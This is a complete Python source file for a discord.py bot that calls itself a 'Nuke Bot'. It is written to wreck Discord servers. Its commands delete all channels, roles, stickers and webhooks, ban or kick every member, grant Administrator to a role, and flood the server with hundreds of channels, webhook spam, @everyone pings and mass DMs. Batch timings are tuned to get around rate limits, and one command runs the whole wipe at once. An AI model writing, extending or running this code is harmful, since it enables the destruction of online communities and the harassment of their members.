import discord
from discord.ext import commands
import asyncio
import os

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ─────────────────────────────────────────────
# CORE HELPERS
# ─────────────────────────────────────────────

async def safe(coro):
    try:
        return await coro
    except Exception:
        pass

STOPPED = False

async def batch(coros, size=5, delay=0.5):
    """Run coros in batches of `size` with `delay` seconds between each batch."""
    global STOPPED
    coros = list(coros)
    for i in range(0, len(coros), size):
        if STOPPED:
            break
        await asyncio.gather(*[safe(c) for c in coros[i:i + size]])
        if i + size < len(coros):
            await asyncio.sleep(delay)

@bot.command()
async def stop(ctx):
    """Stop all running operations immediately"""
    global STOPPED
    STOPPED = True
    await ctx.send("🛑 **All operations stopped.**")
    await asyncio.sleep(2)
    STOPPED = False

# Batch sizes tuned per operation type
BATCH_MSG   = dict(size=25, delay=0.2)   # sending messages
BATCH_WH    = dict(size=30, delay=0.1)   # webhook messages (own rate limit bucket — much faster)
BATCH_CH    = dict(size=8,  delay=0.4)   # create/delete/edit channels
BATCH_ROLE  = dict(size=10, delay=0.3)   # create/delete/edit roles
BATCH_MBR   = dict(size=10, delay=0.3)   # ban/kick/edit members

async def status(ctx, action):
    try:
        await ctx.send(f"✅ `{action}` done.")
    except Exception:
        pass

# ─────────────────────────────────────────────
# HELP
# ─────────────────────────────────────────────

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="🔴 Nuke Bot — Command List", color=0xff0000)

    embed.add_field(name="📁 Channels", value=(
        "`!mc <name> <count>` — Mass create text channels\n"
        "`!mcv <name> <count>` — Mass create voice channels\n"
        "`!mcat <name> <count>` — Mass create categories\n"
        "`!dac` — Delete ALL channels\n"
        "`!datc` — Delete all text channels\n"
        "`!davc` — Delete all voice channels\n"
        "`!dacat` — Delete all categories\n"
        "`!renameall <name>` — Rename all channels\n"
        "`!lockall` — Lock all channels\n"
        "`!unlockall` — Unlock all channels\n"
        "`!hideall` — Hide all channels from @everyone\n"
        "`!showall` — Show all channels to @everyone\n"
        "`!slowall <seconds>` — Set slowmode in all channels\n"
        "`!nuke <name> <message>` — 💥 Holy Grail: 500 channels + webhooks, blast simultaneously\n"
        "`!nukeall <name>` — Delete all channels & recreate with name\n"
    ), inline=False)

    embed.add_field(name="🎭 Roles", value=(
        "`!mr <name> <count>` — Mass create roles\n"
        "`!dar` — Delete ALL roles\n"
        "`!renameallr <name>` — Rename all roles\n"
        "`!massrole <role>` — Give role to all members\n"
        "`!stripall` — Remove all roles from all members\n"
        "`!adminrole <role>` — Give a role Administrator perms\n"
        "`!depermsall` — Wipe all permissions from all roles\n"
    ), inline=False)

    embed.add_field(name="👥 Members", value=(
        "`!ban` — Ban ALL members\n"
        "`!kick` — Kick ALL members\n"
        "`!mban <count>` — Ban X members\n"
        "`!mkick <count>` — Kick X members\n"
        "`!massunban` — Unban all banned members\n"
        "`!dmall <message>` — DM all members\n"
        "`!massdeafen` — Deafen all voice members\n"
        "`!massmute` — Mute all voice members\n"
        "`!undeafenall` — Undeafen all voice members\n"
        "`!unmuteall` — Unmute all voice members\n"
        "`!massmove <channel>` — Move all voice members to a channel\n"
    ), inline=False)

    embed.add_field(name="💬 Messaging", value=(
        "`!mcp <name> <count> <pings> <message>` — Create channels, send pings times in each\n"
        "`!spam <count> <message>` — Spam in current channel\n"
        "`!spamall <count> <message>` — Spam in ALL channels\n"
        "`!pingall <count>` — Ping @everyone X times in all channels\n"
        "`!pingr <role> <count>` — Ping a role X times in all channels\n"
        "`!wspam <count> <message>` — ⚡ Webhook spam in current channel (fastest)\n"
        "`!wspamall <count> <message>` — ⚡ Webhook spam in ALL channels simultaneously\n"
        "`!whnuke <name> <count> <pings> <message>` — ⚡ Create channels + webhook, blast pings times each\n"
    ), inline=False)

    embed.add_field(name="🌐 Server", value=(
        "`!renameserver <name>` — Rename the server\n"
        "`!das` — Delete all stickers\n"
        "`!delthreads` — Delete all threads\n"
        "`!delwebhooks` — Delete all webhooks\n"
        "`!webhook <name> <count>` — Mass create webhooks in all channels\n"
        "`!everything` — Run ALL nuke commands at once\n"
    ), inline=False)

    await ctx.send(embed=embed)

# ─────────────────────────────────────────────
# CHANNELS
# ─────────────────────────────────────────────

@bot.command()
async def mc(ctx, name: str, count: int):
    await batch([ctx.guild.create_text_channel(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mc {name} {count}")

@bot.command()
async def mcv(ctx, name: str, count: int):
    await batch([ctx.guild.create_voice_channel(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcv {name} {count}")

@bot.command()
async def mcat(ctx, name: str, count: int):
    await batch([ctx.guild.create_category(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcat {name} {count}")

@bot.command()
async def dac(ctx):
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "dac")

@bot.command()
async def datc(ctx):
    await batch([ch.delete() for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "datc")

@bot.command()
async def davc(ctx):
    await batch([ch.delete() for ch in ctx.guild.voice_channels], **BATCH_CH)
    await status(ctx, "davc")

@bot.command()
async def dacat(ctx):
    await batch([cat.delete() for cat in ctx.guild.categories], **BATCH_CH)
    await status(ctx, "dacat")

@bot.command()
async def renameall(ctx, *, name: str):
    await batch([ch.edit(name=name) for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, f"renameall {name}")

@bot.command()
async def lockall(ctx):
    await batch(
        [ch.set_permissions(ctx.guild.default_role, send_messages=False) for ch in ctx.guild.text_channels],
        **BATCH_CH
    )
    await status(ctx, "lockall")

@bot.command()
async def unlockall(ctx):
    await batch(
        [ch.set_permissions(ctx.guild.default_role, send_messages=True) for ch in ctx.guild.text_channels],
        **BATCH_CH
    )
    await status(ctx, "unlockall")

@bot.command()
async def hideall(ctx):
    await batch(
        [ch.set_permissions(ctx.guild.default_role, view_channel=False) for ch in ctx.guild.channels],
        **BATCH_CH
    )
    await status(ctx, "hideall")

@bot.command()
async def showall(ctx):
    await batch(
        [ch.set_permissions(ctx.guild.default_role, view_channel=True) for ch in ctx.guild.channels],
        **BATCH_CH
    )
    await status(ctx, "showall")

@bot.command()
async def slowall(ctx, seconds: int):
    await batch([ch.edit(slowmode_delay=seconds) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"slowall {seconds}s")

@bot.command()
async def nuke(ctx, name: str, *, message: str = "@everyone"):
    """Holy Grail — fill server with channels, webhook in each, blast simultaneously"""
    # Step 1: create channels as fast as possible
    channels = []
    async def make_ch():
        ch = await safe(ctx.guild.create_text_channel(name))
        if ch:
            channels.append(ch)
    await asyncio.gather(*[make_ch() for _ in range(500)])

    # Step 2: attach one webhook to every channel in parallel
    async def make_wh(ch):
        return await safe(ch.create_webhook(name="nuke"))
    webhooks = [w for w in await asyncio.gather(*[make_wh(ch) for ch in channels]) if w]

    # Step 3: blast message through ALL webhooks 30 times each simultaneously
    coros = [wh.send(message) for wh in webhooks for _ in range(30)]
    await batch(coros, **BATCH_WH)

@bot.command()
async def nukeall(ctx, *, name: str = "nuked"):
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
    await batch([ctx.guild.create_text_channel(name) for _ in range(10)], **BATCH_CH)
    await status(ctx, f"nukeall {name}")

# ─────────────────────────────────────────────
# ROLES
# ─────────────────────────────────────────────

@bot.command()
async def mr(ctx, name: str, count: int):
    await batch([ctx.guild.create_role(name=name) for _ in range(count)], **BATCH_ROLE)
    await status(ctx, f"mr {name} {count}")

@bot.command()
async def dar(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch([r.delete() for r in ctx.guild.roles if r not in protected], **BATCH_ROLE)
    await status(ctx, "dar")

@bot.command()
async def renameallr(ctx, *, name: str):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch([r.edit(name=name) for r in ctx.guild.roles if r not in protected], **BATCH_ROLE)
    await status(ctx, f"renameallr {name}")

@bot.command()
async def massrole(ctx, role: discord.Role):
    await batch([m.add_roles(role) for m in ctx.guild.members if not m.bot], **BATCH_MBR)
    await status(ctx, f"massrole {role.name}")

@bot.command()
async def stripall(ctx):
    async def strip(m):
        removable = [r for r in m.roles if r != ctx.guild.default_role and r < ctx.guild.me.top_role]
        if removable:
            await m.remove_roles(*removable)
    await batch([strip(m) for m in ctx.guild.members if not m.bot], **BATCH_MBR)
    await status(ctx, "stripall")

@bot.command()
async def adminrole(ctx, role: discord.Role):
    await role.edit(permissions=discord.Permissions(administrator=True))
    await status(ctx, f"adminrole {role.name}")

@bot.command()
async def depermsall(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch(
        [r.edit(permissions=discord.Permissions.none()) for r in ctx.guild.roles if r not in protected],
        **BATCH_ROLE
    )
    await status(ctx, "depermsall")

# ─────────────────────────────────────────────
# MEMBERS
# ─────────────────────────────────────────────

@bot.command()
async def ban(ctx):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.ban(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, "ban")

@bot.command()
async def kick(ctx):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.kick(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, "kick")

@bot.command()
async def mban(ctx, count: int):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner and not m.bot][:count]
    await batch([m.ban(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"mban {count}")

@bot.command()
async def mkick(ctx, count: int):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner and not m.bot][:count]
    await batch([m.kick(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"mkick {count}")

@bot.command()
async def massunban(ctx):
    bans = [entry async for entry in ctx.guild.bans()]
    await batch([ctx.guild.unban(entry.user) for entry in bans], **BATCH_MBR)
    await status(ctx, "massunban")

@bot.command()
async def dmall(ctx, *, message: str):
    await batch([m.send(message) for m in ctx.guild.members if not m.bot], **BATCH_MSG)
    await status(ctx, "dmall")

@bot.command()
async def massdeafen(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(deafen=True) for m in members], **BATCH_MBR)
    await status(ctx, "massdeafen")

@bot.command()
async def massmute(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(mute=True) for m in members], **BATCH_MBR)
    await status(ctx, "massmute")

@bot.command()
async def undeafenall(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(deafen=False) for m in members], **BATCH_MBR)
    await status(ctx, "undeafenall")

@bot.command()
async def unmuteall(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(mute=False) for m in members], **BATCH_MBR)
    await status(ctx, "unmuteall")

@bot.command()
async def massmove(ctx, channel: discord.VoiceChannel):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.move_to(channel) for m in members], **BATCH_MBR)
    await status(ctx, f"massmove {channel.name}")

# ─────────────────────────────────────────────
# MESSAGING
# ─────────────────────────────────────────────

@bot.command()
async def mcp(ctx, name: str, count: int, pings: int = 5, *, message: str = "@everyone"):
    async def create_and_ping():
        ch = await ctx.guild.create_text_channel(name)
        for _ in range(pings):
            await safe(ch.send(message))
    await batch([create_and_ping() for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcp {name} {count} x{pings}")

@bot.command()
async def spam(ctx, count: int, *, message: str):
    await batch([ctx.send(message) for _ in range(count)], **BATCH_MSG)

@bot.command()
async def spamall(ctx, count: int, *, message: str):
    coros = [ch.send(message) for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"spamall {count}")

@bot.command()
async def pingall(ctx, count: int):
    coros = [ch.send("@everyone") for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"pingall {count}")

@bot.command()
async def pingr(ctx, role: discord.Role, count: int):
    coros = [ch.send(role.mention) for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"pingr {role.name} {count}")

@bot.command()
async def wspam(ctx, count: int, *, message: str):
    """Webhook spam in current channel — fastest possible spam"""
    wh = await ctx.channel.create_webhook(name="spam")
    await batch([wh.send(message) for _ in range(count)], **BATCH_WH)
    await safe(wh.delete())

@bot.command()
async def wspamall(ctx, count: int, *, message: str):
    """Create a webhook in every channel and spam them all simultaneously"""
    webhooks = []
    for ch in ctx.guild.text_channels:
        wh = await safe(ch.create_webhook(name="spam"))
        if wh:
            webhooks.append(wh)
    coros = [wh.send(message) for wh in webhooks for _ in range(count)]
    await batch(coros, **BATCH_WH)
    await batch([wh.delete() for wh in webhooks], **BATCH_CH)
    await status(ctx, f"wspamall {count}")

@bot.command()
async def whnuke(ctx, name: str, count: int, pings: int = 10, *, message: str = "@everyone"):
    """Create `count` channels each with a webhook, blast `pings` messages through each"""
    channels = []
    for _ in range(count):
        ch = await safe(ctx.guild.create_text_channel(name))
        if ch:
            channels.append(ch)
    await batch([ch.create_webhook(name="nuke") for ch in channels], **BATCH_CH)
    webhooks = []
    for ch in channels:
        whs = await safe(ch.webhooks())
        if whs:
            webhooks.extend(whs)
    coros = [wh.send(message) for wh in webhooks for _ in range(pings)]
    await batch(coros, **BATCH_WH)
    await status(ctx, f"whnuke {name} {count} x{pings}")

# ─────────────────────────────────────────────
# SERVER
# ─────────────────────────────────────────────

@bot.command()
async def renameserver(ctx, *, name: str):
    await ctx.guild.edit(name=name)
    await status(ctx, f"renameserver {name}")

@bot.command()
async def das(ctx):
    await batch([s.delete() for s in ctx.guild.stickers], **BATCH_CH)
    await status(ctx, "das")

@bot.command()
async def delthreads(ctx):
    await batch([t.delete() for t in ctx.guild.threads], **BATCH_CH)
    await status(ctx, "delthreads")

@bot.command()
async def delwebhooks(ctx):
    webhooks = await ctx.guild.webhooks()
    await batch([w.delete() for w in webhooks], **BATCH_CH)
    await status(ctx, "delwebhooks")

@bot.command()
async def webhook(ctx, name: str, count: int):
    async def make_webhook(ch):
        for _ in range(count):
            await safe(ch.create_webhook(name=name))
    await batch([make_webhook(ch) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"webhook {name} {count}")

@bot.command()
async def everything(ctx):
    guild = ctx.guild
    protected_members = {guild.me, guild.owner}
    protected_roles = {guild.default_role, guild.me.top_role}
    await batch([ch.delete() for ch in guild.channels], **BATCH_CH)
    await batch([r.delete() for r in guild.roles if r not in protected_roles], **BATCH_ROLE)
    await batch([m.ban(reason="Nuke") for m in guild.members if m not in protected_members], **BATCH_MBR)
    await batch([s.delete() for s in guild.stickers], **BATCH_CH)
    await batch([guild.create_text_channel("nuked") for _ in range(10)], **BATCH_CH)

# ─────────────────────────────────────────────
# READY
# ─────────────────────────────────────────────

@bot.event
async def on_ready():
    print(f"Nuke bot ready: {bot.user}")

bot.run(os.getenv("NUKE_TOKEN"))
